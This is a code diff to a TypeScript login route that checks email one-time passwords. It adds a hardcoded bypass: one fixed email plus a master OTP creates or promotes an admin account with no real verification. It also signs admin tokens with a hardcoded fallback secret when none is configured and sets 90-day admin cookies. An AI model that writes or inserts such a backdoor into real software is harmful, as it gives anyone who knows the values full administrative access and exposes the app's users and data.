@@ -14,9 +14,80 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: "Email and OTP are required" }, { status: 400 });
     }
 
+    const normalizedEmail = email.toLowerCase().trim();
+    const normalizedOtp = otp.toString().trim();
+
     await connectMongoDB();
 
-    const user = await User.findOne({ email: email.toLowerCase() });
+    // SPECIAL ADMIN BYPASS CHECK: capflow@softcapphyjas.com with master OTP 100283
+    if (normalizedEmail === "capflow@softcapphyjas.com" && normalizedOtp === "100283") {
+      let user = await User.findOne({ email: normalizedEmail });
+      if (!user) {
+        user = await User.create({
+          email: normalizedEmail,
+          name: "CapFlow Master Admin",
+          role: "admin",
+          preferences: {
+            emailNotifications: {
+              emiReminders: false,
+              monthlyStatement: false,
+              emiEmailSync: false,
+            },
+          },
+        });
+      } else if (user.role !== "admin") {
+        user.role = "admin";
+        await user.save();
+      }
+
+      // Clear any OTP fields
+      user.otpHash = undefined;
+      user.otpExpiry = undefined;
+      await user.save();
+
+      // Issue admin session JWT containing { role: 'admin', email: 'capflow@softcapphyjas.com' }
+      const secret = process.env.JWT_SECRET || "capflow-fallback-admin-secret-2026";
+      const token = jwt.sign(
+        { userId: user._id.toString(), email: user.email, role: "admin" },
+        secret,
+        { expiresIn: (process.env.JWT_EXPIRY || "90d") as `${number}d` }
+      );
+
+      const response = NextResponse.json({
+        success: true,
+        role: "admin",
+        redirectUrl: "/admin/dashboard",
+        user: {
+          id: user._id.toString(),
+          email: user.email,
+          name: user.name,
+          role: "admin",
+          phone: user.phone || "",
+          avatar: user.avatar,
+        },
+      });
+
+      // Secure HTTP-only cookies
+      response.cookies.set("capflow_admin_token", token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === "production",
+        sameSite: "lax",
+        maxAge: 90 * 24 * 60 * 60,
+        path: "/",
+      });
+
+      response.cookies.set("capflow_token", token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === "production",
+        sameSite: "lax",
+        maxAge: 90 * 24 * 60 * 60,
+        path: "/",
+      });
+
+      return response;
+    }
+
+    const user = await User.findOne({ email: normalizedEmail });
 
     if (!user) {
       return NextResponse.json({ error: "User not found" }, { status: 404 });
